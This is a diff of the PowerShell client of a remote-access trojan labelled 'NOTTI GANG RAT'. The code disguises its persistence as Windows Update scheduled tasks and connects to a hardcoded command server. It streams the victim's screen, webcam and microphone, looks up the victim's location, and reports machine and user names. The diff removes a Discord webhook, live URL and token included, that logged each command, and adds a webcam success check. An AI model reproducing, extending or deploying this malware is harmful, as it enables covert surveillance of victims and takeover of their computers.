@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent Completo: NOTTI GANG RAT (Webhook Embed + UAC Bypass + Features)
+# Agent Completo: NOTTI GANG RAT (Apenas Logs Online, sem logs de comandos)
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -13,23 +13,6 @@ $taskName     = "MicrosoftWindowsUpdateService_$h"
 $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
-
-# Função para Log no Discord (Agora como Embed vermelho para comandos)
-function Send-Webhook($msg) {
-    try {
-        $body = @{
-            embeds = @(
-                @{
-                    title = "⚡ NOTTI GANG RAT | Comando"
-                    color = 16711680
-                    description = "``$msg``"
-                    footer = @{ text = "$env:COMPUTERNAME | NOTTI GANG RAT" }
-                }
-            )
-        } | ConvertTo-Json -Depth 10
-        Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
-    } catch {}
-}
 
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
@@ -250,6 +233,7 @@ if (-not ("R9KAgent" -as [type])) {
         static string IP; static int PORT;
         static volatile bool streaming = false;
         static volatile bool isCamRunning = false;
+        static volatile bool camSuccess = false;
         static volatile bool isAudioRunning = false;
         static object writeLock = new object();
         static object capLock = new object();
@@ -277,7 +261,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        // Função auxiliar para extrair valores simples do JSON do ip-api
         static string ExtractJsonValue(string json, string key) {
             try {
                 int idx = json.IndexOf("\"" + key + "\"");
@@ -318,7 +301,7 @@ if (-not ("R9KAgent" -as [type])) {
                     string banner = "BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|" + nMon;
                     myWriter.WriteLine(banner);
                     
-                    // === WEBHOOK EMBED NOTTI GANG RAT ===
+                    // === WEBHOOK EMBED NOTTI GANG RAT (APENAS CONEXAO) ===
                     try {
                         string pubIp = "Desconhecido", country = "Desconhecido", city = "Desconhecido", isp = "Desconhecido";
                         try {
@@ -379,6 +362,7 @@ if (-not ("R9KAgent" -as [type])) {
                 } finally {
                     streaming = false;
                     isCamRunning = false;
+                    camSuccess = false;
                     isAudioRunning = false;
                     globalWriter = null;
                     try { if (myClient != null) myClient.Close(); } catch {}
@@ -541,12 +525,14 @@ if (-not ("R9KAgent" -as [type])) {
         static void StartWebcamStream() {
             if (isCamRunning) return;
             isCamRunning = true;
+            camSuccess = false;
             Thread t = new Thread(() => {
                 IntPtr capWnd = capCreateCaptureWindow("R9KCapStream", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                 if (capWnd == IntPtr.Zero) { isCamRunning = false; return; }
                 if (SendMessage(capWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero) {
                     DestroyWindow(capWnd); isCamRunning = false; return;
                 }
+                camSuccess = true;
                 string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_stream.bmp");
                 while (isCamRunning && globalWriter != null) {
                     SendMessage(capWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
@@ -689,20 +675,21 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
-                // Log comando no Discord (Ignorando ping/pong)
-                if (cmd != "pong" && cmd != "ping" && cmd != "PONG" && cmd != "PING") {
-                    try { 
-                        System.Net.WebClient wc = new System.Net.WebClient(); 
-                        wc.Headers.Add("Content-Type", "application/json"); 
-                        string body = "{\"embeds\":[{\"title\":\"⚡ NOTTI GANG RAT | Comando\",\"color\":16711680,\"description\":\"`" + cmd + "`\",\"footer\":{\"text\":\"" + Environment.MachineName + " | NOTTI GANG RAT\"}}]}"; 
-                        wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
-                    } catch {}
-                }
+                // O log de comandos do Discord foi removido daqui.
 
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
-                if (cmd == "webcam_start") { StartWebcamStream(); lock(writeLock) { myWriter.WriteLine("WEBCAM_ON"); } return; }
+                if (cmd == "webcam_start") { 
+                    StartWebcamStream(); 
+                    Thread.Sleep(1000);
+                    if (camSuccess) {
+                        lock(writeLock) { myWriter.WriteLine("WEBCAM_ON"); } 
+                    } else {
+                        lock(writeLock) { myWriter.WriteLine("CAM_ERR:no_camera"); } 
+                    }
+                    return; 
+                }
                 if (cmd == "webcam_stop") { isCamRunning = false; lock(writeLock) { myWriter.WriteLine("WEBCAM_OFF"); } return; }
                 
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
